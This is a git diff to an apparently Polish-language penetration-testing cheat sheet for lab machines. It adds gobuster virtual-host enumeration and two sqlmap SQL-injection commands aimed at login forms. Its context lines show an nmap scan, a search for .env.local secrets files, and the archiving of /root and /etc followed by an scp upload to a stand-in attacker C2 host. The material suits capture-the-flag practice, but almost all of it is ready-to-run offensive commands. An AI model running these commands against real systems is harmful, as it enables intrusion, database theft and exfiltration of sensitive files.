@@ -7,6 +7,9 @@ nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt ip
 ```
 gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
 ```
+```
+gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts_found.txt
+```
 ## Find
 ```
 sudo find / -name ".env.local" -type f 2>/dev/null
@@ -134,6 +137,15 @@ tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ```
 # Red
+## SQLMAP
+Do edycji zmienne jak nazwa submita, pola username i password
+```
+sqlmap -u "http://10.114.131.93/login.php" --data="pma_username=admin&pma_password=password&submit=Go" --method POST --level 3 --risk 2 --batch --dbs
+```
+Dla bardziej opornych serwerow
+```
+sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" --method POST --level 3 --risk 2 --batch --dbs
+```
 ## Notatki
 ### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
 ```
